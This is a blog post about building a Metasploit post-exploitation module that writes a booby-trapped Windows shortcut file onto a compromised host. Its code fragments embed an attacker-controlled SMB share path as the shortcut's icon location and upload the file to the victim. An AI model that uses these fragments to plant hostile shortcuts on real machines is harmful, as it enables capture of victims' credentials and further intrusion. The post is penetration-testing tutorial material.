  <h1>Developing the LNK Metasploit post module with Mona</h1>
  <h2></h2>
</div>
<div class="content">
  

<p>I have been using the LNK trick I talked about in my <a href="/blog/2012/2/11/ms08_068-ms10_046-fun-until-2018.html">last post</a> for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&rsquo;s target.</p>

<p>Of course the first place I looked was Meterpreter&rsquo;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to <a href="http://msdn.microsoft.com/en-us/library/aa969393.aspx">work with COM objects</a>. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch <a href="http://msdn.microsoft.com/en-us/library/dd871305(PROT.10">using the spec</a>.aspx).. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz</p>

<p>Enter ‘<a href="http://redmine.corelan.be/projects/mona">mona</a>’, the <a href="http://www.corelan.be/">Corelan Team’s</a> exploit development plugin for <a href="http://immunityinc.com/products-immdbg.shtml">Immunity Debugger</a>. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.</p>

<p>We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:</p>

<p>[](<a href="http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd3849/1329630395387/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd384a/1329630395767/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-">http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd3849/1329630395387/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd384a/1329630395767/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-</a>)</p>

<p>I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued:</p>

<h3 id="mona-header-c-autoexec-lnk:55c6b94172d34c381e4b7719d4bc76d6">“!mona header C:autoexec.lnk”</h3>

<p>[](<a href="http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd384b/1329630396067/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd384c/1329630399647/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-">http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd384b/1329630396067/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72ae4b0b79cd4cd384c/1329630399647/Windows-Live-Writer-Developing-the-LNK-Metasploit-Post-modul_15108-</a>)</p>

<p>As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:</p>

<h3 id="header-rex-text-to-unicode-c-192-168-100-100-w00t-bogusimage-png:55c6b94172d34c381e4b7719d4bc76d6">header &lt;&lt; Rex::Text.to_unicode(&ldquo;C:\%\192.168.100.100\w00t\bogusimage.png`&ldquo;)</h3>

<p>I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.</p>

<p>Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?</p>

<p>Now I have 3 challenges:</p>

<ol>
<li><p>It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.</p></li>

<li><p>It needs to upload the file to the exploited system.</p></li>

<li><p>It needs to be up to code on the Metasploit coding standards</p></li>
</ol>

<p>Changing the line I found for the share name into this:</p>

<h3 id="lnk-rex-text-to-unicode-datastore-lhost-datastore-sharename-datastore-iconfilename:55c6b94172d34c381e4b7719d4bc76d6">lnk &lt;&lt; Rex::Text.to_unicode(&rdquo;\#{datastore[&lsquo;LHOST&rsquo;]}#{datastore[&lsquo;SHARENAME&rsquo;]}#{datastore[&lsquo;ICONFILENAME&rsquo;]}`&ldquo;)</h3>

<p>‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:</p>

<ul>
<li><p>OptAddressRange.new(&ldquo;LHOST&rdquo;, [ true, &ldquo;Host listening for incoming SMB/WebDAV traffic&rdquo;, nil]),</p></li>

<li><p>OptString.new(&ldquo;SHARENAME&rdquo;, [ true, &ldquo;Share name on LHOST&rdquo;, &ldquo;share1&rdquo;]),<br />
OptString.new(&ldquo;ICONFILENAME&rdquo;, [ true, &ldquo;File name on LHOST&rsquo;s share&rdquo;, &ldquo;icon.png&rdquo;])</p></li>
</ul>

<p>OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.</p>

<p>Problem 1 solved. Problem 2 was just as easy, the following line:</p>

<h3 id="file-client-fs-file-new-datastore-lnkfilename-wb:55c6b94172d34c381e4b7719d4bc76d6">file = client.fs.file.new(datastore[&lsquo;LNKFILENAME&rsquo;], &lsquo;wb&rsquo;)</h3>

<p>creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.</p>

<p>Problem 3 is much more tricky, but here is the path to wisdom:</p>

<h3 id="ruby-metasploit-directory-tools-msftidy-rb-path-to-my-module-evil-rb:55c6b94172d34c381e4b7719d4bc76d6">ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb</h3>

<p>Hope this helps spur people into trying their hand at developing some modules of their own.</p>
